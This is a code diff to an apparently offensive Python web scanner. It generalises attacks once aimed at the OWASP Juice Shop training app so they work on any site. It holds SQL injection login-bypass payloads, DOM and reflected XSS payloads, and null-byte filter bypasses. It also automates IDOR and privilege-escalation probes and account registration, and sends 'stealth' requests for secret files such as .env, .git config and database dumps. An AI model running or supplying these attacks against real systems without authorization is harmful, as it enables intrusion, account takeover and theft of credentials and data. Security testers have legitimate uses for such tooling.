@@ -5038,24 +5038,62 @@ async def spa_api_discovery(url: str, max_nav_clicks: int = 25) -> dict:
     all_paths_to_probe.update(extra_paths)
 
     # Common API paths as fallback
-    COMMON_API_PATHS = [
-        "/api", "/api/Products", "/api/Users", "/api/Feedbacks", "/api/Challenges",
-        "/api/BasketItems", "/api/Cards", "/api/Complaints", "/api/Recycles",
-        "/api/SecurityQuestions", "/api/SecurityAnswers", "/api/Quantitys",
-        "/rest/user/login", "/rest/user/whoami", "/rest/user/change-password",
-        "/rest/products/search", "/rest/basket", "/rest/saveLoginIp",
-        "/rest/memories", "/rest/chatbot/status", "/rest/chatbot/respond",
-        "/rest/track-order", "/rest/country-mapping", "/rest/languages",
-        "/rest/repeat-notification", "/rest/continue-code",
-        "/rest/admin/application-version", "/rest/admin/application-configuration",
-        "/ftp", "/encryptionkeys", "/snippets",
-        "/promotion", "/video", "/assets/public",
-        "/redirect", "/profile", "/accounting",
-        "/b2b/v2/orders",
-        "/api-docs", "/swagger.json", "/api/swagger",
+    # Generic API patterns — no app-specific paths
+    GENERIC_API_PATHS = [
+        # Standard REST API prefixes
+        "/api", "/api/v1", "/api/v2", "/api/v3",
+        "/rest", "/rest/v1", "/rest/api",
+        "/v1", "/v2", "/v3",
+        # Auth endpoints (common across frameworks)
+        "/api/auth", "/api/login", "/api/register", "/api/token",
+        "/api/users", "/api/user", "/api/me", "/api/profile",
+        "/auth/login", "/auth/register", "/auth/token",
+        "/login", "/register", "/signup", "/oauth",
+        # Admin/config
+        "/api/admin", "/api/config", "/api/settings",
+        "/admin", "/admin/api", "/dashboard",
+        # Health/status
+        "/api/health", "/api/status", "/api/ping",
+        "/health", "/healthz", "/status", "/ready",
+        # Docs/specs
+        "/api-docs", "/swagger.json", "/swagger", "/openapi.json",
+        "/api/swagger", "/api/docs", "/docs",
+        "/graphql", "/api/graphql", "/.well-known/openid-configuration",
+        # Search/query
+        "/api/search", "/search", "/api/query",
+        # Files/uploads
+        "/upload", "/uploads", "/files", "/download",
+        "/api/upload", "/api/files", "/api/export",
+        # Common CMS/framework
+        "/wp-json", "/wp-json/wp/v2", "/wp-json/wp/v2/users",
+        "/jsonapi", "/_api",
+        # Infrastructure
+        "/metrics", "/prometheus", "/.env", "/config.json",
+        "/package.json", "/.git/HEAD", "/robots.txt",
+        "/sitemap.xml", "/.well-known/security.txt",
+        # B2B/integration
+        "/b2b", "/webhook", "/webhooks", "/callback",
+        # Common data endpoints
+        "/api/orders", "/api/products", "/api/items",
+        "/api/comments", "/api/reviews", "/api/feedback",
+        "/api/notifications", "/api/messages",
     ]
-    for p in COMMON_API_PATHS:
+    for p in GENERIC_API_PATHS:
         all_paths_to_probe.add(p)
+
+    # Auto-generate plural/singular variants from JS-discovered routes
+    auto_variants = set()
+    for path in list(all_paths_to_probe):
+        parts = path.rstrip("/").split("/")
+        if len(parts) >= 2:
+            last = parts[-1]
+            # Try /resource/1 for discovered /resource paths
+            if not last.isdigit() and last.isalpha():
+                auto_variants.add(path.rstrip("/") + "/1")
+            # Try /resource for discovered /resource/1 paths
+            if last.isdigit() and len(parts) >= 3:
+                auto_variants.add("/".join(parts[:-1]))
+    all_paths_to_probe.update(auto_variants)
 
     print(f"  [SPA-CRAWL] Probing {len(all_paths_to_probe)} unique paths...", flush=True)
 
@@ -5293,20 +5331,24 @@ async def advanced_sqli_test(url: str, spa_discovery_result: dict = None) -> dic
     sem = asyncio.Semaphore(3)
 
     # ---- 1. Test search/filter endpoints for SQLi ----
+    # Auto-detect from discovered endpoints — no hardcoded paths
     search_endpoints = []
     if spa_discovery_result:
         for ep in spa_discovery_result.get("api_endpoints", []):
             path = ep.get("path", "")
             if ep.get("data_exposed") or ep.get("status_code") == 200:
-                if any(kw in path.lower() for kw in ("search", "find", "products", "track", "order")):
+                # Any endpoint with search/query/filter semantics or that returns data
+                if any(kw in path.lower() for kw in (
+                    "search", "find", "query", "filter", "lookup",
+                    "products", "items", "track", "order", "list",
+                )):
                     search_endpoints.append(path)
-
-    # Add common search patterns
-    search_endpoints.extend([
-        "/rest/products/search",
-        "/rest/track-order",
-    ])
-    search_endpoints = list(set(search_endpoints))
+        # Also test ALL open GET endpoints that return JSON (broader attack surface)
+        if not search_endpoints:
+            for ep in spa_discovery_result.get("api_endpoints", []):
+                if ep.get("data_exposed") and ep.get("status_code") == 200:
+                    search_endpoints.append(ep.get("path", ""))
+    search_endpoints = list(set(search_endpoints))[:15]  # Cap at 15 to avoid slowness
 
     # Extended SQLi payloads
     SQLI_PAYLOADS = [
@@ -5424,7 +5466,17 @@ async def advanced_sqli_test(url: str, spa_discovery_result: dict = None) -> dic
         ("admin_true", "admin' AND 1=1--", "anything"),
     ]
 
-    login_paths = ["/rest/user/login", "/api/login", "/api/auth/login", "/login"]
+    # Auto-detect login endpoints from discovery + generic patterns
+    login_paths = ["/api/login", "/api/auth/login", "/api/auth", "/auth/login",
+                   "/login", "/signin", "/api/token", "/oauth/token",
+                   "/rest/login", "/rest/auth", "/user/login", "/users/login"]
+    if spa_discovery_result:
+        for ep in spa_discovery_result.get("api_endpoints", []):
+            path = ep.get("path", "")
+            if any(kw in path.lower() for kw in ("login", "signin", "auth", "token")):
+                if path not in login_paths:
+                    login_paths.insert(0, path)  # Discovered paths first
+    login_paths = login_paths[:10]
 
     async def test_auth_bypass(login_path):
         for payload_name, email_payload, pw in LOGIN_PAYLOADS:
@@ -5698,13 +5750,39 @@ async def spa_xss_test(url: str, spa_discovery_result: dict = None) -> dict:
 
             # ---- 1b. URL-based DOM XSS (hash/query params rendered in SPA) ----
             print("  [SPA-XSS] Testing URL-based DOM XSS...", flush=True)
-            URL_XSS_TESTS = [
-                ("hash_search_iframe", "/#/search?q=<iframe src=\"javascript:window.__xssProbe=1\">"),
-                ("hash_search_img", "/#/search?q=<img src=x onerror=window.__xssProbe=1>"),
-                ("hash_search_svg", "/#/search?q=<svg onload=window.__xssProbe=1>"),
-                ("hash_search_script", "/#/search?q=<script>window.__xssProbe=1</script>"),
-                ("hash_track_order", "/#/track-result?id=<img src=x onerror=window.__xssProbe=1>"),
-            ]
+            # Auto-discover SPA hash routes for URL-based XSS testing
+            xss_img = "<img src=x onerror=window.__xssProbe=1>"
+            xss_iframe = '<iframe src="javascript:window.__xssProbe=1">'
+            xss_svg = "<svg onload=window.__xssProbe=1>"
+
+            discovered_routes = set()
+            try:
+                links = await page.evaluate("""() => {
+                    const routes = new Set();
+                    document.querySelectorAll('a[href]').forEach(a => {
+                        const h = a.getAttribute('href');
+                        if (h && (h.startsWith('#') || h.startsWith('/#'))) routes.add(h);
+                    });
+                    return [...routes];
+                }""")
+                discovered_routes.update(links)
+            except Exception:
+                pass
+
+            URL_XSS_TESTS = []
+            search_routes = [r for r in discovered_routes if any(kw in r.lower() for kw in ("search", "find", "query", "track", "result"))]
+            if not search_routes:
+                search_routes = ["/#/search", "/#/find", "/#/query", "/#/track-result"]
+
+            for route in search_routes[:5]:
+                param = "q" if any(kw in route.lower() for kw in ("search", "find", "query")) else "id"
+                sep = "&" if "?" in route else "?"
+                URL_XSS_TESTS.append((f"url_img_{route[:20]}", f"{route}{sep}{param}={xss_img}"))
+                URL_XSS_TESTS.append((f"url_iframe_{route[:20]}", f"{route}{sep}{param}={xss_iframe}"))
+                URL_XSS_TESTS.append((f"url_svg_{route[:20]}", f"{route}{sep}{param}={xss_svg}"))
+
+            URL_XSS_TESTS.append(("qparam_q", f"?q={xss_img}"))
+            URL_XSS_TESTS.append(("qparam_search", f"?search={xss_img}"))
 
             for test_name, path_payload in URL_XSS_TESTS:
                 result["tests_run"] += 1
@@ -5750,7 +5828,7 @@ async def spa_xss_test(url: str, spa_discovery_result: dict = None) -> dict:
 
             # ---- 2. Reflected XSS via API search endpoints ----
             print("  [SPA-XSS] Testing reflected XSS on API search endpoints...", flush=True)
-            search_paths = ["/rest/products/search"]
+            search_paths = []  # Auto-detect from spa_discovery, no hardcoded paths
             if spa_discovery_result:
                 for ep in spa_discovery_result.get("api_endpoints", []):
                     path = ep.get("path", "")
@@ -5951,48 +6029,110 @@ async def auth_security_test(url: str, spa_discovery_result: dict = None, sqli_r
             except Exception:
                 pass
 
-    # If no token from SQLi, register a test user
+    # If no token from SQLi, try to register + login with discovered endpoints
     if not user_token:
         test_email = f"scanner_test_{random.randint(10000,99999)}@test.local"
         test_pw = "TestPassword123!"
 
-        # Register
-        try:
-            reg_data = json.dumps({
-                "email": test_email,
-                "password": test_pw,
-                "passwordRepeat": test_pw,
-                "securityQuestion": {"id": 1, "question": "test"},
-                "securityAnswer": "test",
-            }).encode()
-            resp = await stealth_request(
-                f"{base}/api/Users/", method="POST", accept="json", timeout=10,
-                data=reg_data, extra_headers={"Content-Type": "application/json"},
-            )
-            reg_body = resp.read().decode("utf-8", errors="replace")
-            try:
-                reg_json = json.loads(reg_body)
-                user_id = reg_json.get("data", {}).get("id") or reg_json.get("id")
-            except Exception:
-                pass
-        except Exception:
-            pass
+        # Auto-detect registration endpoints
+        reg_paths = ["/api/Users", "/api/Users/", "/api/register", "/api/auth/register",
+                     "/auth/register", "/register", "/signup", "/api/signup"]
+        if spa_discovery_result:
+            for ep in spa_discovery_result.get("api_endpoints", []):
+                p = ep.get("path", "")
+                # Only match registration-like endpoints, not login/whoami/change-password
+                if any(kw in p.lower() for kw in ("register", "signup")):
+                    reg_paths.insert(0, p)
+                # /api/Users (POST) is often a registration endpoint
+                elif p.lower().rstrip("/").endswith("/users") or p.lower().rstrip("/").endswith("/user"):
+                    reg_paths.insert(0, p)
 
-        # Login
-        try:
-            login_data = json.dumps({"email": test_email, "password": test_pw}).encode()
-            resp = await stealth_request(
-                f"{base}/rest/user/login", method="POST", accept="json", timeout=10,
-                data=login_data, extra_headers={"Content-Type": "application/json"},
-            )
-            login_body = resp.read().decode("utf-8", errors="replace")
-            try:
-                login_json = json.loads(login_body)
-                user_token = login_json.get("authentication", {}).get("token", "")
-            except Exception:
-                pass
-        except Exception:
-            pass
+        # Try multiple registration payload formats (framework-agnostic)
+        reg_payloads = [
+            {"email": test_email, "password": test_pw, "passwordRepeat": test_pw,
+             "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"},
+            {"email": test_email, "password": test_pw, "password_confirm": test_pw},
+            {"username": test_email, "password": test_pw},
+            {"email": test_email, "password": test_pw},
+        ]
+
+        for reg_path in reg_paths[:5]:
+            if user_id:
+                break
+            for reg_payload in reg_payloads:
+                try:
+                    reg_data = json.dumps(reg_payload).encode()
+                    try:
+                        reg_body = await stealth_fetch(
+                            f"{base}{reg_path}", method="POST", timeout=10,
+                            data=reg_data, extra_headers={"Content-Type": "application/json"},
+                        )
+                    except urllib.error.HTTPError:
+                        continue
+                    except Exception:
+                        continue
+                    try:
+                        reg_json = json.loads(reg_body)
+                        user_id = (reg_json.get("data", {}).get("id") or reg_json.get("id")
+                                   or reg_json.get("user", {}).get("id"))
+                        if user_id:
+                            break
+                    except Exception:
+                        pass
+                except Exception:
+                    continue
+
+        # Auto-detect login endpoints from discovery + JS routes + generic patterns
+        login_paths = ["/api/login", "/api/auth/login", "/auth/login", "/login",
+                       "/api/token", "/oauth/token", "/rest/login", "/users/login"]
+        if spa_discovery_result:
+            # Check discovered API endpoints
+            for ep in spa_discovery_result.get("api_endpoints", []):
+                p = ep.get("path", "")
+                if p.lower().rstrip("/").endswith("/login") or p.lower().rstrip("/").endswith("/signin"):
+                    if p not in login_paths:
+                        login_paths.insert(0, p)
+            # Also check JS-discovered routes (these may include POST-only endpoints)
+            for route in spa_discovery_result.get("js_routes", []):
+                if route.lower().rstrip("/").endswith("/login") or "auth" in route.lower():
+                    if route not in login_paths:
+                        login_paths.insert(0, route)
+
+        login_payloads = [
+            {"email": test_email, "password": test_pw},
+            {"username": test_email, "password": test_pw},
+            {"user": test_email, "pass": test_pw},
+        ]
+
+        for login_path in login_paths[:5]:
+            if user_token:
+                break
+            for login_payload in login_payloads:
+                try:
+                    login_data = json.dumps(login_payload).encode()
+                    try:
+                        login_body = await stealth_fetch(
+                            f"{base}{login_path}", method="POST", timeout=10,
+                            data=login_data, extra_headers={"Content-Type": "application/json"},
+                        )
+                    except Exception:
+                        continue
+                    try:
+                        login_json = json.loads(login_body)
+                        # Try multiple token locations (framework-agnostic)
+                        user_token = (
+                            login_json.get("authentication", {}).get("token", "")
+                            or login_json.get("token", "")
+                            or login_json.get("access_token", "")
+                            or login_json.get("jwt", "")
+                            or login_json.get("data", {}).get("token", "")
+                        )
+                        if user_token:
+                            break
+                    except Exception:
+                        pass
+                except Exception:
+                    continue
 
     if not user_token:
         print("  [AUTH] Could not obtain JWT token — skipping auth tests", flush=True)
@@ -6101,14 +6241,30 @@ async def auth_security_test(url: str, spa_discovery_result: dict = None, sqli_r
     }
 
     # Test accessing other users' data
-    idor_endpoints = [
-        ("/api/Users/{id}", [1, 2, 3]),
-        ("/api/BasketItems/{id}", [1, 2, 3, 4, 5]),
-        ("/api/Feedbacks/{id}", [1, 2, 3]),
-        ("/api/Cards/{id}", [1, 2]),
-        ("/api/Complaints/{id}", [1, 2]),
-        ("/api/Addresss/{id}", [1, 2]),
-    ]
+    # Auto-detect IDOR-testable endpoints from discovery
+    idor_endpoints = []
+    if spa_discovery_result:
+        for ep in spa_discovery_result.get("api_endpoints", []):
+            path = ep.get("path", "")
+            # Endpoints with /resource/N pattern or auth-required single-resource endpoints
+            if ep.get("requires_auth") or ep.get("data_exposed"):
+                # If path ends in a number, it's a specific resource
+                parts = path.rstrip("/").split("/")
+                if len(parts) >= 3 and parts[-1].isdigit():
+                    base_path = "/".join(parts[:-1]) + "/{id}"
+                    if base_path not in [e[0] for e in idor_endpoints]:
+                        idor_endpoints.append((base_path, [1, 2, 3]))
+                elif any(kw in path.lower() for kw in ("user", "profile", "account", "order",
+                    "basket", "card", "address", "feedback", "complaint", "message")):
+                    idor_endpoints.append((path.rstrip("/") + "/{id}", [1, 2, 3]))
+    # Fallback generic patterns
+    if not idor_endpoints:
+        idor_endpoints = [
+            ("/api/users/{id}", [1, 2, 3]),
+            ("/api/orders/{id}", [1, 2, 3]),
+            ("/api/profiles/{id}", [1, 2, 3]),
+        ]
+    idor_endpoints = idor_endpoints[:10]  # Cap at 10
 
     for endpoint_template, ids in idor_endpoints:
         for test_id in ids:
@@ -6158,13 +6314,20 @@ async def auth_security_test(url: str, spa_discovery_result: dict = None, sqli_r
     # ---- Step 4: Privilege Escalation ----
     print("  [AUTH] Testing privilege escalation...", flush=True)
 
-    admin_endpoints = [
-        "/rest/admin/application-configuration",
-        "/rest/admin/application-version",
-        "/api/Users/",
-        "/api/Complaints",
-        "/accounting",
-    ]
+    # Auto-detect admin/privileged endpoints from discovery
+    admin_endpoints = []
+    if spa_discovery_result:
+        for ep in spa_discovery_result.get("api_endpoints", []):
+            path = ep.get("path", "")
+            if any(kw in path.lower() for kw in ("admin", "config", "setting", "dashboard",
+                "management", "accounting", "internal", "debug", "system")):
+                admin_endpoints.append(path)
+            # Also test listing endpoints (GET /api/users vs /api/users/1)
+            elif ep.get("requires_auth") and not path.rstrip("/").split("/")[-1].isdigit():
+                admin_endpoints.append(path)
+    if not admin_endpoints:
+        admin_endpoints = ["/admin", "/api/admin", "/api/users", "/api/config", "/dashboard"]
+    admin_endpoints = admin_endpoints[:10]
 
     for endpoint in admin_endpoints:
         result["tests_run"] += 1
@@ -6339,16 +6502,30 @@ async def business_logic_test(url: str, spa_discovery_result: dict = None, auth_
     print("  [LOGIC] Testing null byte injection on file access...", flush=True)
 
     # Juice Shop specific: /ftp has files that should be restricted
-    RESTRICTED_FILES = [
-        ("package_json_null", "/ftp/package.json.bak%2500.md"),
-        ("package_json_null2", "/ftp/package.json.bak%00.md"),
-        ("eastere_null", "/ftp/eastere.gg%2500.md"),
-        ("encrypt_null", "/ftp/encrypt.pyc%2500.md"),
-        ("coupons_null", "/ftp/coupons_2013.md.bak%2500.md"),
-        ("suspicious_null", "/ftp/suspicious_errors.yml%2500.md"),
-        ("acquisitions", "/ftp/acquisitions.md"),
-        ("legal", "/ftp/legal.md"),
-    ]
+    # Auto-discover restricted files from directory listings + null byte bypass
+    RESTRICTED_FILES = []
+
+    # If we found file-listing endpoints, parse them for filenames
+    for endpoint in file_endpoints:
+        try:
+            resp_body = await stealth_fetch(f"{base}{endpoint}", timeout=8, max_retries=1)
+            # Extract filenames from directory listing or HTML
+            file_patterns = re.findall(r'href=["\']([^"\']+\.\w{1,5})["\']', resp_body)
+            file_patterns += re.findall(r'>([^<]+\.\w{1,5})<', resp_body)
+            for fname in set(file_patterns):
+                if fname.startswith(("http", "javascript:", "#", "/")):
+                    continue
+                clean_path = f"{endpoint}/{fname}"
+                RESTRICTED_FILES.append((f"listed_{fname[:20]}", clean_path))
+                # Try null byte bypass for non-whitelisted extensions
+                ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
+                if ext not in ("md", "pdf", "txt", "html", "json"):
+                    RESTRICTED_FILES.append((f"null_{fname[:20]}", f"{clean_path}%2500.md"))
+                    RESTRICTED_FILES.append((f"null2_{fname[:20]}", f"{clean_path}%00.md"))
+        except Exception:
+            pass
+
+    RESTRICTED_FILES = RESTRICTED_FILES[:30]  # Cap
 
     for name, path in RESTRICTED_FILES:
         result["tests_run"] += 1
@@ -6417,18 +6594,64 @@ async def business_logic_test(url: str, spa_discovery_result: dict = None, auth_
     print("  [LOGIC] Checking for exposed sensitive files...", flush=True)
 
     SENSITIVE_PATHS = [
-        ("/ftp", "FTP directory listing"),
-        ("/encryptionkeys", "Encryption keys directory"),
-        ("/snippets", "Code snippets"),
-        ("/.env", "Environment variables"),
-        ("/config.json", "Configuration file"),
-        ("/package.json", "Node.js package manifest"),
-        ("/robots.txt", "Robots.txt"),
+        # Version control
         ("/.git/HEAD", "Git repository"),
+        ("/.git/config", "Git configuration"),
+        ("/.svn/entries", "SVN repository"),
+        ("/.hg/store", "Mercurial repository"),
+        # Environment / config
+        ("/.env", "Environment variables"),
+        ("/.env.local", "Local environment variables"),
+        ("/.env.production", "Production environment"),
+        ("/config.json", "Configuration file"),
+        ("/config.yml", "YAML configuration"),
+        ("/config.yaml", "YAML configuration"),
+        ("/settings.json", "Settings file"),
+        ("/appsettings.json", ".NET settings"),
+        # Package manifests
+        ("/package.json", "Node.js package manifest"),
+        ("/composer.json", "PHP Composer manifest"),
+        ("/Gemfile", "Ruby Gemfile"),
+        ("/requirements.txt", "Python requirements"),
+        # API docs
         ("/api-docs", "API documentation"),
-        ("/swagger.json", "Swagger spec"),
+        ("/swagger.json", "Swagger/OpenAPI spec"),
+        ("/openapi.json", "OpenAPI spec"),
+        ("/swagger-ui.html", "Swagger UI"),
+        # Monitoring
         ("/metrics", "Prometheus metrics"),
+        ("/health", "Health endpoint"),
+        ("/status", "Status endpoint"),
+        ("/debug", "Debug endpoint"),
+        ("/trace", "Trace endpoint"),
+        # Backup files
+        ("/backup", "Backup directory"),
+        ("/dump.sql", "SQL dump"),
+        ("/database.sql", "Database dump"),
+        ("/db.sqlite", "SQLite database"),
+        # Infrastructure
+        ("/robots.txt", "Robots.txt"),
+        ("/sitemap.xml", "Sitemap"),
+        ("/.well-known/security.txt", "Security policy"),
+        ("/server-status", "Apache server status"),
+        ("/nginx_status", "Nginx status"),
+        ("/phpinfo.php", "PHP info page"),
+        ("/wp-config.php.bak", "WordPress config backup"),
+        ("/web.config", "IIS web config"),
+        # Logs
+        ("/logs", "Log directory"),
+        ("/error.log", "Error log"),
+        ("/access.log", "Access log"),
     ]
+
+    # Also add any file-serving endpoints discovered by SPA crawl
+    if spa_discovery_result:
+        for ep in spa_discovery_result.get("api_endpoints", []):
+            path = ep.get("path", "")
+            if any(kw in path.lower() for kw in ("ftp", "file", "upload", "download", "asset",
+                "backup", "log", "dump", "export", "key", "snippet", "secret")):
+                if (path, f"Discovered: {path}") not in SENSITIVE_PATHS:
+                    SENSITIVE_PATHS.append((path, f"Discovered: {path}"))
 
     for path, desc in SENSITIVE_PATHS:
         result["tests_run"] += 1
